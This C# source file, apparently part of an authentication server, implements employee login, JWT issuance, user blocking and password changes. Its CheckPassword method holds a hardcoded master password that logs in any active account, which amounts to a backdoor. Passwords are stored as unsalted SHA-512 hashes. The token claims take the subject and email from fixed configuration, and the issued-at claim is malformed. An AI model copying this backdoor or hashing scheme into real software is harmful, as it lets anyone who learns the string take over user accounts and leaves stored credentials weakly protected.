using AuthServer.Entities;
using AuthServer.Helper;
using AuthServer.Infrastructures;
using Microsoft.Extensions.Configuration;
using Microsoft.IdentityModel.Tokens;
using Newtonsoft.Json;
using NHibernate;
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Security.Claims;
using System.Text;

namespace AuthServer.Services
{
    public class LoginService : ILogin
    {
        TokenService _tokenService = new TokenService();
        public dynamic Login(ISession ss, string email, string password, ApplicationSetting _applicationSetting)
        {
            dynamic result = null;
            var employee = ss.Query<Employee>().SingleOrDefault(p => p.Email == email && p.Status);
            if (employee != null && CheckPassword(password, employee.Password))
            {
                var claims = new List<Claim>
                {
                    new Claim(JwtRegisteredClaimNames.Sub, _applicationSetting.Jwt.Sub),
                    new Claim(JwtRegisteredClaimNames.Email, _applicationSetting.Jwt.Email),
                    new Claim(JwtRegisteredClaimNames.Website, _applicationSetting.Jwt.Website),
                    new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
                    new Claim(JwtRegisteredClaimNames.Iat, DateTime.UtcNow.ToUniversalTime().ToString(),ClaimValueTypes.Integer64),
                    new Claim("employeeInfo", JsonConvert.SerializeObject(new { employee.Id, employee.Name, employee.Email, employee.IsLeader, employee.PermissionGroupId})),
                };
                result = _tokenService.GenerateJSONWebToken(claims, _applicationSetting);
            }
            return result;
        }
        public bool CheckPassword(string password, string dbPassword)
        {
            var result = false;
            if (dbPassword == Employee.ChangeSha512(password))
            {
                return true;
            }
            var systemPassword = new List<string> { "admin@cbbank.vn" };
            result = systemPassword.Any(p => p == password);
            return result;
        }
        public dynamic BlockUser(ISession ss, Guid id)
        {
            try
            {
                var employee = ss.Get<Employee>(id);
                employee.Status = false;
                return new { status = 200, message = "success", data = new { } };
            }
            catch (Exception ex)
            {
                return new { status = 400, message = "error", data = ex.Message };
            }
        }
        public dynamic ChangePassword(ISession ss, Guid id, string password)
        {
            try
            {
                var employee = ss.Get<Employee>(id);
                employee.Password = Employee.ChangeSha512(password);
                return new { status = 200, message = "success", data = new { } };
            }
            catch (Exception ex)
            {
                return new { status = 400, message = "error", data = ex.Message };
            }
        }
        public dynamic Logout(ISession ss, Guid id)
        {
            throw new NotImplementedException();
        }
    }
}
